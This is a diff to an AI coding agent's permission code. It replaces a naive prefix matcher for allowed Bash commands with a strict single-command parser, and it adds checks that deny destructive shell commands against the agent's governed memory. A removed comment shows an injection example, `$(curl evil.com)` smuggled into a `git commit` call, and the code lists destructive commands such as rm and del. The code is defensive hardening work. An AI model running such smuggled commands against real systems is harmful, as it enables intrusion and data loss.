@@ -34,6 +34,7 @@ import {
   canonicalizeAgentHomePolicyPath,
   isAutoWritableAgentHomePath,
   isProtectedAgentHomeReadTarget,
+  isGovernedMemoryMutationTarget,
 } from './agent-home-policy.js';
 
 export type PermissionMode =
@@ -855,31 +856,21 @@ export function parseAllowedToolPattern(entry: string): { tool: string; pattern:
   return { tool: entry.toLowerCase(), pattern: null };
 }
 
-/**
- * Check if a bash command matches an allowed pattern using LEGACY naive
- * `startsWith` semantics. Used when no LLM-backed prefix extractor is
- * available — see `matchesBashPatternByExtractedPrefix` for the safer path.
- *
- * SECURITY NOTE: this path is vulnerable to command injection via shell
- * metacharacters (`git commit -m "x" $(curl evil.com)` matches `git commit:*`).
- * It is preserved for backward compatibility with SDK consumers that don't
- * have an LLM provider available; the KodaX REPL itself ALWAYS provides
- * an extractor in production, so this branch is only exercised by tests
- * and headless embeds. Will be removed when all known consumers migrate
- * (target: v0.8).
- */
-function matchesBashPatternLegacy(command: string, pattern: string): boolean {
-  // Reject "*" pattern for safety
+/** No-provider fallback: only a literal, single command can earn prefix authorization. */
+function matchesBashPatternWithoutExtractor(command: string, pattern: string): boolean {
   if (pattern === '*') return false;
-
-  // Prefix wildcard: "git commit:*" matches "git commit -m 'msg'"
-  if (pattern.endsWith(':*')) {
-    const prefix = pattern.slice(0, -2);
-    return command.startsWith(prefix);
-  }
-
-  // Exact match
-  return command === pattern;
+  // Quoting differs across cmd, PowerShell and POSIX. Ambiguous expansion or
+  // control syntax requires confirmation even when one parser treats it as text.
+  if (/[;&|<>\r\n`$()%!^{}]/u.test(command)) return false;
+  const tree = parseBashCommand(command);
+  if (tree.unparseable || tree.statements.length !== 1 || tree.statements[0]!.stages.length !== 1) return false;
+  const stage = tree.statements[0]!.stages[0]!;
+  if (stage.redirections.length) return false;
+  if (!pattern.endsWith(':*')) return command === pattern;
+  const prefix = pattern.slice(0, -2);
+  if (!/^[\w./-]+(?:[ \t]+[\w./-]+)*$/u.test(prefix)) return false;
+  const tokens = prefix.split(/[ \t]+/u);
+  return stage.argv.length >= tokens.length && tokens.every((token, index) => stage.argv[index] === token);
 }
 
 /**
@@ -921,11 +912,9 @@ function matchesBashPatternByExtractedPrefix(
  * Patterns then match against the extracted prefix exactly. This eliminates
  * the pre-FEATURE_153 startsWith-based injection surface.
  *
- * When `extractor` is NOT supplied, falls back to the legacy
- * `command.startsWith(pattern)` matcher. Documented as insecure in
- * `matchesBashPatternLegacy` — KodaX's REPL always supplies an extractor in
- * production; the legacy branch exists for tests and headless SDK consumers
- * without LLM access.
+ * Without an extractor, a deterministic single-command parser preserves simple
+ * prefix rules. Complex or ambiguous shell syntax falls through to confirmation
+ * without adding a model request for headless SDK consumers.
  *
  * Note: Only Bash tool is supported for pattern matching.
  *
@@ -947,7 +936,7 @@ export async function isToolCallAllowed(
     return false;
   }
 
-  const command = (input.command as string) ?? '';
+  const command = typeof input.command === 'string' ? input.command : '';
 
   // Determine which patterns are relevant for bash. If none, no LLM call needed.
   const bashPatterns: Array<{ pattern: string | null }> = [];
@@ -994,9 +983,9 @@ export async function isToolCallAllowed(
     return false;
   }
 
-  // Legacy path: naive startsWith.
+  // Headless path: deterministic, literal token-boundary matching.
   for (const { pattern } of bashPatterns) {
-    if (pattern && matchesBashPatternLegacy(command, pattern)) {
+    if (pattern && matchesBashPatternWithoutExtractor(command, pattern)) {
       return true;
     }
   }
@@ -2253,15 +2242,36 @@ function collectRawOutputRedirectionTargets(command: string): string[] {
   return targets;
 }
 
+const DESTRUCTIVE_SHELL_MUTATIONS = new Set([
+  'rm', 'rmdir', 'rd', 'del', 'erase', 'remove-item', 'ri', 'mv', 'move', 'move-item', 'rename-item', 'ren', 'rename',
+]);
+
 function collectBashWriteTargetsAtDepth(
   command: string,
   depth: number,
   includeHeuristicPaths: boolean,
+  executionCwd?: string,
+  agentHome?: string,
+  destructiveTargets?: Set<string>,
 ): string[] {
   const targets = new Set<string>();
-  const pushTarget = (value: string | undefined): void => {
+  const tree = parseBashCommand(command);
+  let cwd = executionCwd;
+  const resolveTarget = (value: string): string => {
+    let expanded = expandHomeDirectory(value).replace(/^(?:\$env:KODAX_(?:CONFIG_)?HOME|\$\{KODAX_(?:CONFIG_)?HOME\}|\$KODAX_(?:CONFIG_)?HOME|%KODAX_(?:CONFIG_)?HOME%)(?=$|[\\/])/iu,
+      () => agentHome ?? getAgentConfigHome());
+    if (process.platform === 'win32') expanded = expanded.replace(/^(?:%USERPROFILE%|\$env:USERPROFILE)(?=$|[\\/])/iu, () => process.env.USERPROFILE ?? os.homedir());
+    const homePattern = process.platform === 'win32' ? /^(?:\$HOME|\$\{HOME\})(?=$|[\\/])/iu : /^(?:\$HOME|\$\{HOME\})(?=$|[\\/])/u;
+    expanded = expanded.replace(homePattern, () => os.homedir());
+    return cwd === undefined ? value : resolveExecutionPath(expanded, cwd);
+  };
+  const pushTarget = (value: string | undefined, destructive = false): void => {
     const trimmed = value?.trim();
-    if (trimmed) targets.add(trimmed);
+    if (trimmed) {
+      const resolved = resolveTarget(trimmed);
+      targets.add(resolved);
+      if (destructive) destructiveTargets?.add(resolved);
+    }
   };
 
   // 1. Heuristic path tokens (covers e.g. `cp src.ts dst.ts` where neither
@@ -2271,13 +2281,12 @@ function collectBashWriteTargetsAtDepth(
     for (const extractedPath of extractPathsFromCommand(command)) {
       pushTarget(extractedPath);
     }
-  } else {
+  } else if (executionCwd === undefined || tree.unparseable) {
     for (const target of collectRawOutputRedirectionTargets(command)) {
       pushTarget(target);
     }
   }
 
-  const tree = parseBashCommand(command);
   if (tree.unparseable) {
     // A shell payload can contain syntax deliberately rejected by the AST
     // (notably backticks) while still exposing a deterministic redirect.
@@ -2291,6 +2300,7 @@ function collectBashWriteTargetsAtDepth(
           nested,
           depth + 1,
           includeHeuristicPaths,
+          cwd, agentHome, destructiveTargets,
         )) {
           pushTarget(target);
         }
@@ -2301,6 +2311,10 @@ function collectBashWriteTargetsAtDepth(
 
   for (const stmt of tree.statements) {
     for (const stage of stmt.stages) {
+      if (cwd !== undefined && ['cd', 'chdir', 'set-location', 'sl'].includes(stage.argv[0]?.toLowerCase() ?? '')) {
+        const directory = stage.argv.filter(value => !['/d', '-path', '-literalpath', '--'].includes(value.toLowerCase())).at(-1);
+        if (directory && stage.argv.length > 1) cwd = resolveTarget(directory);
+      }
       // 2. Redirection targets — output redirects only; input redirects
       //    don't write. Null-device redirects ARE included so plan-mode
       //    won't mistake `echo hi 2>NUL > /tmp/out` for "no targets".
@@ -2316,10 +2330,10 @@ function collectBashWriteTargetsAtDepth(
       if (cmd === 'tee') {
         for (const t of collectTeeTargets(stage)) pushTarget(t);
       } else if (POWERSHELL_WRITE_TOKENS.has(cmd)) {
-        for (const t of collectPowerShellWriteTargets(stage)) pushTarget(t);
+        for (const t of collectPowerShellWriteTargets(stage)) pushTarget(t, DESTRUCTIVE_SHELL_MUTATIONS.has(commandBasename(cmd)));
       }
       if (!includeHeuristicPaths) {
-        for (const target of collectDirectCommandWriteTargets(stage)) pushTarget(target);
+        for (const target of collectDirectCommandWriteTargets(stage)) pushTarget(target, DESTRUCTIVE_SHELL_MUTATIONS.has(commandBasename(cmd)));
       }
 
       const nested = depth < 3 ? getNestedShellCommand(stage.argv) : undefined;
@@ -2328,6 +2342,7 @@ function collectBashWriteTargetsAtDepth(
           nested,
           depth + 1,
           includeHeuristicPaths,
+          cwd, agentHome, destructiveTargets,
         )) {
           pushTarget(target);
         }
@@ -2336,6 +2351,14 @@ function collectBashWriteTargetsAtDepth(
   }
 
   return Array.from(targets);
+}
+
+/** Direct shell targets only; opaque trusted Host programs remain outside OS isolation. */
+export function getGovernedMemoryShellWriteDenial(command: string, cwd: string, agentHome?: string): string | undefined {
+  const destructiveTargets = new Set<string>();
+  return collectBashWriteTargetsAtDepth(command, 0, false, cwd, agentHome, destructiveTargets)
+    .some(target => isGovernedMemoryMutationTarget(target, cwd, agentHome, destructiveTargets.has(target)))
+    ? '[Tool Error] Shell mutation of governed Memory is denied; use the Memory Control Plane.' : undefined;
 }
 
 export function getBashOutsideProjectWriteRisk(
